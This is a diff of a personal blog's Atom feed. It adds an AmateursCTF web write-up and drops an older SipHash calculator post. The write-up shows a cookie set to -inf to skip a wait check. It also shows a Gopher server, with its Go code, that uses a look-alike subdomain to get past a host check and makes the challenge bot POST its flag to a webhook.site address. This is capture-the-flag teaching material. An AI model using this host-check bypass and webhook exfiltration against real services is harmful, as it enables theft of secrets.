@@ -1,4 +1,138 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://www.cjxol.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cjxol.com/" rel="alternate" type="text/html" /><updated>2023-06-06T01:05:35+01:00</updated><id>https://www.cjxol.com/feed.xml</id><title type="html">cjxol.com</title><entry><title type="html">justCTF 2023 Dangerous (Web) Writeup</title><link href="https://www.cjxol.com/posts/justctf-2023-web-dangerous-writeup/" rel="alternate" type="text/html" title="justCTF 2023 Dangerous (Web) Writeup" /><published>2023-06-05T00:00:00+01:00</published><updated>2023-06-05T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/justctf-2023-web-dangerous-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/justctf-2023-web-dangerous-writeup/"><![CDATA[<p><a href="https://2023.justctf.team/challenges/18">justCTF 2023 Dangerous (Web)</a><br />
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://www.cjxol.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cjxol.com/" rel="alternate" type="text/html" /><updated>2023-07-26T17:51:14+01:00</updated><id>https://www.cjxol.com/feed.xml</id><title type="html">cjxol.com</title><entry><title type="html">AmateursCTF Web Writeup</title><link href="https://www.cjxol.com/posts/amateursctf-web-writeup/" rel="alternate" type="text/html" title="AmateursCTF Web Writeup" /><published>2023-07-25T00:00:00+01:00</published><updated>2023-07-25T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/amateursctf-web-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/amateursctf-web-writeup/"><![CDATA[<p><a href="https://ctf.amateurs.team/">AmateursCTF</a><br />
+<a href="https://ctftime.org/event/1983">Event on CTFtime</a></p>
+
+<p>3 web challenge writeups in this post:</p>
+<ul>
+  <li><a href="#wait-an-eternity">wait-an-eternity</a></li>
+  <li><a href="#go-gopher">go-gopher</a></li>
+</ul>
+
+<h2 id="wait-an-eternity">wait-an-eternity</h2>
+
+<ul>
+  <li>Description:
+    <blockquote>
+      <p>My friend sent me this website and said that if I wait long enough, I could get and flag! Not that I need a flag or anything, but I’ve been waiting a couple days and it’s still asking me to wait. I’m getting a little impatient, could you help me get the flag?</p>
+    </blockquote>
+  </li>
+  <li>Author: voxal</li>
+  <li>Entry point: <a href="https://waiting-an-eternity.amt.rs/">waiting-an-eternity.amt.rs</a></li>
+</ul>
+
+<h3 id="first-eternity">First eternity</h3>
+
+<p>The webpage just had text “just wait an eternity”. When inspect the request, there is a “Refresh” header with a huge value and url with a secret code.</p>
+
+<p><img src="/assets/image/amateursctf-web-writeup/first-eternity.png" alt="First eternity" /></p>
+
+<h3 id="another-eternity">Another eternity</h3>
+
+<p>Visit the url in the “Refresh” header, it shows a page saying “welcome. please wait another eternity.”.</p>
+
+<p>Inspect the request, it sets a cookie “time” with a value appears to be the current timestamp like <code class="highlighter-rouge">1690326049.1573777</code>. With the cookie set, refresh the page, and the page shows text like “you have not waited an eternity. you have only waited 228.13574051856995 seconds”. The time mentioned in the message appears to be the difference between the current timestamp and the timestamp in the cookie.</p>
+
+<p>Sets the cookie to a large value, it says have only waited a large negative number of seconds. Sets the cookie to a negative value, it says have waited a large number of seconds, but there is still no flag.</p>
+
+<p>The message told to wait an eternity, but how long is an eternity? The internet says the definitions of eternity is “<a href="https://www.dictionary.com/browse/eternity">infinite time</a>”, “<a href="https://dictionary.cambridge.org/dictionary/english/eternity">time that never ends</a>” or “a very long time”. Hmm, how long the website would consider to be an eternity? Look up gunicorn that appears to be the web server according to the response header, the website is running Python. In Python, a number (except <code class="highlighter-rouge">-inf</code>) minus <code class="highlighter-rouge">-inf</code> would be <code class="highlighter-rouge">inf</code>. So, if the cookie value is <code class="highlighter-rouge">-inf</code>, the number of seconds have waited would be <code class="highlighter-rouge">inf</code>, and website would consider it to be an eternity.</p>
+
+<p><img src="/assets/image/amateursctf-web-writeup/another-eternity.png" alt="Another eternity" /></p>
+
+<p>After two eternities, I got the flag:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>amateursCTF{im_g0iNg_2_s13Ep_foR_a_looo0ooO0oOooooOng_t1M3}
+</code></pre></div></div>
+
+<h4 id="speculation">Speculation</h4>
+
+<p>The web server is probably taking value from the cookie, and use <code class="highlighter-rouge">float()</code> to convert it to a float, thus <code class="highlighter-rouge">float('-inf')</code> would be float <code class="highlighter-rouge">-inf</code>. Number of seconds waited is calculated by subtracting the float value from the current timestamp. (Actually, yes, can confirm with the <a href="https://github.com/les-amateurs/AmateursCTF-Public/blob/b9b40a55969e3e1553ed14e66bb460a9370db509/2023/web/waiting-an-eternity/main.py#L18">source code</a>)</p>
+
+<h2 id="go-gopher">go-gopher</h2>
+
+<ul>
+  <li>Description:
+    <blockquote>
+      <p>psst… i know flag sharing isn’t allowed, and i found this page where someone seems to be recieving flags from someone else. can you somehow find a way to hijack this site so it gives me flags? thanks.</p>
+    </blockquote>
+  </li>
+  <li>Author: voxal</li>
+  <li>Entry point:
+    <ul>
+      <li>gopher://amt.rs:31290/</li>
+      <li><a href="https://gopher-bot.amt.rs/">gopher-bot.amt.rs</a></li>
+    </ul>
+  </li>
+  <li>Downloads:
+    <ul>
+      <li><a href="https://amateurs-prod.storage.googleapis.com/uploads/7c93488d980366dd6255b08e1bb8ac751565508920151011276c964116df5479/bot.go">bot.go</a></li>
+      <li><a href="https://amateurs-prod.storage.googleapis.com/uploads/b652421619610ac09116d516ac4f659ac95d73402048c96e29cfb2ad183104f7/main.go">main.go</a></li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="the-challenge">The challenge</h3>
+
+<p>Submit and Visit function for bot</p>
+
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">func</span> <span class="n">Submit</span><span class="p">(</span><span class="n">w</span> <span class="n">http</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">,</span> <span class="n">r</span> <span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Request</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">r</span><span class="o">.</span><span class="n">ParseForm</span><span class="p">()</span>
+	<span class="n">u</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">url</span><span class="o">.</span><span class="n">Parse</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">Form</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="s">"url"</span><span class="p">))</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="o">||</span> <span class="o">!</span><span class="n">strings</span><span class="o">.</span><span class="n">HasPrefix</span><span class="p">(</span><span class="n">u</span><span class="o">.</span><span class="n">Host</span><span class="p">,</span> <span class="s">"amt.rs"</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">w</span><span class="o">.</span><span class="n">Write</span><span class="p">([]</span><span class="kt">byte</span><span class="p">(</span><span class="s">"Invalid url"</span><span class="p">))</span>
+		<span class="k">return</span>
+	<span class="p">}</span>
+	<span class="n">w</span><span class="o">.</span><span class="n">Write</span><span class="p">([]</span><span class="kt">byte</span><span class="p">(</span><span class="n">Visit</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">Form</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="s">"url"</span><span class="p">))))</span>
+<span class="p">}</span>
+<span class="k">func</span> <span class="n">Visit</span><span class="p">(</span><span class="n">url</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
+	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+	<span class="n">res</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">gopher</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"Something went wrong: %s"</span><span class="p">,</span> <span class="n">err</span><span class="o">.</span><span class="n">Error</span><span class="p">())</span>
+	<span class="p">}</span>
+	<span class="n">h</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">res</span><span class="o">.</span><span class="n">Dir</span><span class="o">.</span><span class="n">ToText</span><span class="p">()</span>
+	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="kt">string</span><span class="p">(</span><span class="n">h</span><span class="p">))</span>
+	<span class="n">url</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">strings</span><span class="o">.</span><span class="n">CutPrefix</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">Dir</span><span class="o">.</span><span class="n">Items</span><span class="p">[</span><span class="m">2</span><span class="p">]</span><span class="o">.</span><span class="n">Selector</span><span class="p">,</span> <span class="s">"URL:"</span><span class="p">)</span>
+	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+	<span class="n">_</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="n">Post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">"text/plain"</span><span class="p">,</span> <span class="n">bytes</span><span class="o">.</span><span class="n">NewBuffer</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="s">"Failed to make request"</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="s">"Successful visit"</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The bot will make Gopher request to the url provided, extract the URL from the selector of the 3rd item (at index 2) in the response, and make a POST request to the URL with the flag.</p>
+
+<p>The bot does restrict the host of the Gopher url to start with <code class="highlighter-rouge">amt.rs</code>, however this can be easily bypassed with subdomain like <code class="highlighter-rouge">gopher://amt.rs.cjxol.com:31290/</code>. The the server can response with my URL in the relative position, the bot would make a POST request to my URL with the flag. The URL for the POST request is not restricted.</p>
+
+<p><img src="/assets/image/amateursctf-web-writeup/go-gopher-flag.png" alt="go-gopher flag" /></p>
+
+<p>Here is my Gopher server code:</p>
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>
+<span class="k">import</span> <span class="p">(</span>
+        <span class="s">"fmt"</span>
+        <span class="s">"log"</span>
+        <span class="s">"git.mills.io/prologic/go-gopher"</span>
+<span class="p">)</span>
+<span class="k">func</span> <span class="n">hello</span><span class="p">(</span><span class="n">w</span> <span class="n">gopher</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">,</span> <span class="n">r</span> <span class="o">*</span><span class="n">gopher</span><span class="o">.</span><span class="n">Request</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">w</span><span class="o">.</span><span class="n">WriteInfo</span><span class="p">(</span><span class="s">"Hello!"</span><span class="p">)</span>
+        <span class="n">w</span><span class="o">.</span><span class="n">WriteInfo</span><span class="p">(</span><span class="s">"again"</span><span class="p">)</span>
+        <span class="n">w</span><span class="o">.</span><span class="n">WriteItem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">gopher</span><span class="o">.</span><span class="n">Item</span><span class="p">{</span>
+                <span class="n">Selector</span><span class="o">:</span>       <span class="s">"https://webhook.site/[reducted]"</span><span class="p">,</span>
+        <span class="p">})</span>
+        <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"hello"</span><span class="p">)</span>
+<span class="p">}</span>
+<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+        <span class="n">gopher</span><span class="o">.</span><span class="n">HandleFunc</span><span class="p">(</span><span class="s">"/"</span><span class="p">,</span> <span class="n">hello</span><span class="p">)</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">Fatal</span><span class="p">(</span><span class="n">gopher</span><span class="o">.</span><span class="n">ListenAndServe</span><span class="p">(</span><span class="s">"0.0.0.0:31337"</span><span class="p">,</span> <span class="no">nil</span><span class="p">))</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Here is the Gopher response:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iHello!         error.host      1
+iagain          error.host      1
+        https://webhook.site/[reducted]       ::      31337
+.
+</code></pre></div></div>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><category term="ctf web" /><summary type="html"><![CDATA[AmateursCTF Event on CTFtime]]></summary></entry><entry><title type="html">justCTF 2023 Dangerous (Web) Writeup</title><link href="https://www.cjxol.com/posts/justctf-2023-web-dangerous-writeup/" rel="alternate" type="text/html" title="justCTF 2023 Dangerous (Web) Writeup" /><published>2023-06-05T00:00:00+01:00</published><updated>2023-06-05T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/justctf-2023-web-dangerous-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/justctf-2023-web-dangerous-writeup/"><![CDATA[<p><a href="https://2023.justctf.team/challenges/18">justCTF 2023 Dangerous (Web)</a><br />
 <a href="https://ctftime.org/event/1930">Event on CTFtime</a></p>
 
 <h2 id="challenge-description">Challenge Description</h2>
@@ -1266,353 +1400,4 @@ Qualified!
 H3CK_15_
 </code></pre></div></div>
 
-<p>Putting the 3 parts together, got the flag <code class="highlighter-rouge">SEKAI{F4LL_GUY5_H3CK_15_1LL3G4L}</code>.</p>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><summary type="html"><![CDATA[Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.]]></summary></entry><entry><title type="html">SipHash Calculator</title><link href="https://www.cjxol.com/posts/siphash-calculator/" rel="alternate" type="text/html" title="SipHash Calculator" /><published>2022-07-08T00:00:00+01:00</published><updated>2022-07-08T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/siphash-calculator</id><content type="html" xml:base="https://www.cjxol.com/posts/siphash-calculator/"><![CDATA[<link rel="stylesheet" href="/assets/css/bootstrap-custom.css" />
-
-<form class="bootstrap">
-    <div class="form-group row">
-        <label for="message" class="col-2 col-form-label">Message</label>
-        <textarea class="form-control col" id="message" row="1"></textarea>
-        <select id="messageType" class="form-control col-3" title="Message type">
-            <option selected="">Text</option>
-            <option>Hex</option>
-            <option>Base64</option>
-        </select>
-    </div>
-    <div class="form-group row">
-        <label for="key" class="col-2 col-form-label">Key</label>
-        <input class="form-control col" type="text" id="key" />
-        <select id="keyType" class="form-control col-3" title="Key type">
-            <option selected="">Text</option>
-            <option>Hex</option>
-            <option>Decimal</option>
-            <option>Base64</option>
-        </select>
-    </div>
-    <div class="form-group row">
-        <span class="col-2">SipRound</span>
-        <label for="c" class="col-1 col-form-label">c</label>
-        <input class="form-control col-1" type="number" id="c" value="2" min="0" step="1" />
-        <label for="d" class="col-1 col-form-label">d</label>
-        <input class="form-control col-1" type="number" id="d" value="4" min="0" step="1" />
-    </div>
-    <button class="btn btn-primary" type="submit" id="calculate">Calculate</button>
-    <div class="form-group row">
-        <label for="hash" class="col-2 col-form-label">Hash</label>
-        <input class="form-control col" type="text" id="hash" readonly="" />
-        <select id="hashType" class="form-control col-3" title="Hash type">
-            <option selected="">Hex</option>
-            <option>Decimal</option>
-            <option>Base64</option>
-        </select>
-    </div>
-    <div class="alert alert-danger" role="alert" id="error" hidden="">
-        Something went wrong...
-    </div>
-</form>
-
-<p>I implemented the SipHash algorithm followed <a class="citation" href="#siphash">(Aumasson &amp; Bernstein, 2012)</a>. You can see <a href="https://github.com/allc/SipHash">my Python code</a>, and this webpage uses <a href="https://pyscript.net/">PyScript</a> to run Python code in the browser.</p>
-
-<h2 id="references">References</h2>
-
-<ol class="bibliography"><li><span id="siphash">Aumasson, J.-P., &amp; Bernstein, D. J. (2012). SipHash: A Fast Short-Input PRF. In S. Galbraith &amp; M. Nandi (Eds.), <i>Progress in Cryptology - INDOCRYPT 2012</i> (pp. 489–508). Springer Berlin Heidelberg.</span></li></ol>
-
-<py-script>
-from pyodide import create_proxy
-
-from typing import List, Tuple
-import binascii
-
-def big_to_little8(num: int) -&gt; int:
-    """
-    Convert 8-byte big endian integer to little endian integer to work with bitwise operations.
-
-    Parameters
-    ----------
-    num : int
-        Integer to be converted
-    
-    Returns
-    -------
-    int
-        Converted integer
-    """
-    return int.from_bytes(num.to_bytes(8, 'big'), 'little')
-
-def rotl8(num: int, bits: int) -&gt; int:
-    """
-    Bitwise left-rotate of a 8-byte number.
-
-    Parameters
-    ----------
-    num : int
-        Number to be left-rotated
-    bits : int
-        Number of bits to be left-rotated
-    
-    Returns
-    -------
-    int
-        Left-rotated number
-    """
-    return ((num &lt;&lt; bits) &amp; 0xffffffffffffffff) | (num &gt;&gt; (64 - bits))
-
-class SipHash:
-
-    # TODO: Change ways to pass parameters in a more object-oriented way.
-    
-    """
-    Implemented following the algorithm in (Aumasson and Bernstein, 2012).
-
-    Aumasson, JP., Bernstein, D.J. (2012). SipHash: A Fast Short-Input PRF.
-    In: Galbraith, S., Nandi, M. (eds) Progress in Cryptology - INDOCRYPT 2012.
-    INDOCRYPT 2012. Lecture Notes in Computer Science, vol 7668.
-    Springer, Berlin, Heidelberg. https://doi.org/10.1007/978-3-642-34931-7_28
-    """
-
-    def __init__(self, key: int, message: bytes, c=2, d=4) -&gt; None:
-        """
-        Initialise SipHash with a key and message.
-
-        Parameters
-        ----------
-        key : int
-            16-byte big-endian key
-        message : bytes
-            Message to be hashed in big-endian bytes
-        c : int
-            Number of compression rounds
-        d : int
-            Number of finalization round
-        """
-        self.key = key
-        self.message = message
-        self.c = c
-        self.d = d
-        self.hash = None
-
-    def get_hash(self) -&gt; int:
-        """
-        Return hash of the message hashed with the key.
-
-        Return from saved value if the hash has been calculated, or calculate the hash value and save it and return.
-
-        Returns
-        -------
-        int
-            Hash value in little-endian
-        """
-        if self.hash is None:        
-            k0, k1 = self._encode_key(self.key)
-            internal_state = self._initialise_internal_state(k0, k1)
-            internal_state = self._compress(self.message, internal_state)
-            self.hash = self._finalise(internal_state)
-        return self.hash
-
-    def hexdigest(self) -&gt; str:
-        """
-        Return the hex string of the hash.
-
-        Returns
-        -------
-        str
-            Hex string of the hash
-        """
-        return hex(self.get_hash())[2:]
-
-    def _encode_key(self, key: int) -&gt; Tuple[int, int]:
-        """
-        Encode 16-byte key into 8-byte k0 and k1.
-
-        Parameters
-        ----------
-        key : int
-            16-byte big-endian key
-
-        Returns
-        -------
-        (bytes, bytes)
-            Tuple of k0 and k1
-        """
-        return (big_to_little8(key &gt;&gt; 8 * 8), big_to_little8(key &amp; 0xffffffffffffffff))
-
-    def _initialise_internal_state(self, k0: int, k1: int) -&gt; Tuple[int, int, int, int]:
-        """
-        Initialise internal state v0, v1, v2, v3.
-
-        Parameters
-        ----------
-        k0 : int
-            8-byte k0
-        k1 : int
-            8-byte k1
-
-        Returns
-        -------
-        (int, int, int, int)
-            Internal state v0, v1, v2, v3
-        """
-        c1 = 0x736f6d6570736575
-        c2 = 0x646f72616e646f6d
-        c3 = 0x6c7967656e657261
-        c4 = 0x7465646279746573
-        v0 = k0 ^ int(c1)
-        v1 = k1 ^ int(c2)
-        v2 = k0 ^ int(c3)
-        v3 = k1 ^ int(c4)
-        return (v0, v1, v2, v3)
-
-    def _compress(self, message: bytes, internal_state: Tuple[int, int, int, int]) -&gt; Tuple[int, int, int, int]:
-        """
-        Compress the message into internal state.
-
-        Parameters
-        ----------
-        message : bytes
-            Message to be hashed in big endian bytes
-        internal_state : (int, int, int, int)
-            Internal state v0, v1, v2, v3
-
-        Returns
-        -------
-        (int, int, int, int)
-            Internal state with message compressed into
-        """
-        words = self._message_to_words(message)
-
-        v0, v1, v2, v3 = internal_state
-        for word in words:
-            v3 ^= word
-            for _ in range(self.c):
-                v0, v1, v2, v3 = self._sipround((v0, v1, v2, v3))
-            v0 ^= word
-        
-        return (v0, v1, v2, v3)
-
-    def _message_to_words(self, message: bytes) -&gt; List[int]:
-        """
-        Parse message into words
-
-        Parameters
-        ----------
-        message : bytes
-            Message to be hashed in big endian bytes
-
-        Returns
-        -------
-        [int]
-            Message parsed into little-endian words
-        """
-        message_length = len(message)
-        padding_length = (message_length + 1) % 8
-        message = message + b'\x00' * padding_length + (message_length % 256).to_bytes(1, 'little')
-        return [int.from_bytes(message[i: i + 8], 'little') for i in range(0, len(message), 8)]
-
-    def _sipround(self, internal_state: Tuple[int, int, int, int]) -&gt; Tuple[int, int, int, int]:
-        """
-        SipRound to transform internal state.
-
-        Parameters
-        ----------
-        internal_state : (int, int, int, int)
-            Internal state v0, v1, v2, v3
-
-        Returns
-        -------
-        (int, int, int, int)
-            Internal state v0, v1, v2, v3 after SipRound transform
-        """
-        v0, v1, v2, v3 = internal_state
-
-        v0 = (v0 + v1) &amp; 0xffffffffffffffff
-        v1 = rotl8(v1, 13)
-        v1 ^= v0
-        v0 = rotl8(v0, 32)
-        v2 = (v2 + v3) &amp; 0xffffffffffffffff
-        v3 = rotl8(v3, 16)
-        v3 ^= v2
-        v2 = (v2 + v1) &amp; 0xffffffffffffffff
-        v1 = rotl8(v1, 17)
-        v1 ^= v2
-        v2 = rotl8(v2, 32)
-        v0 = (v0 + v3) &amp; 0xffffffffffffffff
-        v3 = rotl8(v3, 21)
-        v3 ^= v0
-
-        return (v0, v1, v2, v3)
-
-    def _finalise(self, internal_state: Tuple[int, int, int, int]) -&gt; int:
-        """
-        Finalise SipHash
-
-        Parameters
-        ----------
-        internal_state : (int, int, int, int)
-            Internal state before finalise
-
-        Returns
-        -------
-        int
-            SipHash result in little-endian representation
-        """
-        v0, v1, v2, v3 = internal_state
-        v2 ^= 0xff
-        for _ in range(self.d):
-            v0, v1, v2, v3 = self._sipround((v0, v1, v2, v3))
-        return v0 ^ v1 ^ v2 ^ v3
-
-def update_hash(event):
-    document.getElementById('error').hidden = True
-    try:
-        message_type = document.getElementById('messageType').value
-        message = document.getElementById('message').value
-        match message_type:
-            case 'Text':
-                message = bytes(message, 'utf8')
-            case 'Hex':
-                message = bytes.fromhex(message)
-            case 'Base64':
-                message = binascii.a2b_base64(message)
-
-        key_type = document.getElementById('keyType').value
-        key = document.getElementById('key').value
-        match key_type:
-            case 'Text':
-                key = int.from_bytes(bytes(key, 'utf-8'), 'big')
-            case 'Hex':
-                key = int(key, 16)
-            case 'Decimal':
-                key = int(key)
-            case 'Base64':
-                key = int.from_bytes(binascii.a2b_base64(key), 'big')
-
-        hash_type = document.getElementById('hashType').value
-        hash_output = document.getElementById('hash')
-        c = int(document.getElementById('c').value)
-        d = int(document.getElementById('d').value)
-        siphash = SipHash(key, message, c, d)
-        match hash_type:
-            case 'Hex':
-                hash_output.value = siphash.hexdigest()
-            case 'Decimal':
-                hash_output.value = siphash.get_hash()
-            case 'Base64':
-                hash_output.value = binascii.b2a_base64(siphash.get_hash().to_bytes(8, 'big')).decode('utf-8')
-    except:
-        document.getElementById('error').hidden = False
-
-on_update = create_proxy(update_hash)
-
-def calculate(event):
-    event.preventDefault()
-    update_hash(event)
-
-on_calculate = create_proxy(calculate)
-
-document.getElementById('calculate').onclick = on_calculate
-
-input_ids = ['message', 'messageType', 'key', 'keyType', 'c', 'd', 'hashType']
-for input_id in input_ids:
-    document.getElementById(input_id).addEventListener('input', on_update)
-</py-script>
-
-<script defer="" src="https://pyscript.net/alpha/pyscript.js"></script>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
+<p>Putting the 3 parts together, got the flag <code class="highlighter-rouge">SEKAI{F4LL_GUY5_H3CK_15_1LL3G4L}</code>.</p>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><summary type="html"><![CDATA[Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.]]></summary></entry></feed>
